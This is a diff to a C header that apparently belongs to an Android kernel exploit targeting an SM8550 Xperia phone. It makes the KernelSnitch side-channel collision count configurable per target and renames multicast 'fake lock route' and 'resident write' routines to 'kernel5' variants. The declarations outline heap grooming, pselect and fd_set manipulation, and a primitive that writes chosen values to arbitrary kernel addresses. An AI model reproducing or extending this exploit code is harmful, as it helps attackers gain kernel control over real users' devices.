@@ -56,10 +56,10 @@ extern int g_core_main;
 extern int g_core_consumer;
 #define CORE (g_core_main)
 #define CONSUMER_CORE (g_core_consumer)
-/* Four timing-derived colliders produced a hash false positive in an unmapped
- * Xperia direct-map hole. Eight keeps the brute-force key selective while
- * remaining practical on the eight-core SM8550. */
-#define KSNITCH_COLLISIONS 8
+#define kernelsnitch_collisions()                                             \
+  (active_offsets && active_offsets->kernelsnitch_collisions                  \
+       ? active_offsets->kernelsnitch_collisions                              \
+       : 4)
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
@@ -204,16 +204,17 @@ uintptr_t prepare_good_kernel_page(void);
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
 int tcp_route_selected(void);
+int kernel5_route_selected(void);
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void reserve_standard_io(void);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 void do_tcp_fake_lock_route(void);
-void do_mcast_fake_lock_route(void);
-int mcast_resident_start(void);
-int mcast_resident_write(uintptr_t target, uintptr_t value);
-void mcast_resident_stop(void);
+void do_kernel5_fake_lock_route(void);
+int kernel5_resident_start(void);
+int kernel5_resident_write(uintptr_t target, uintptr_t value);
+void kernel5_resident_stop(void);
 void reset_main_route_state(void);
 int run_main_route_threads(void);
 void set_pselect_write_mode(uintptr_t target, int mode);
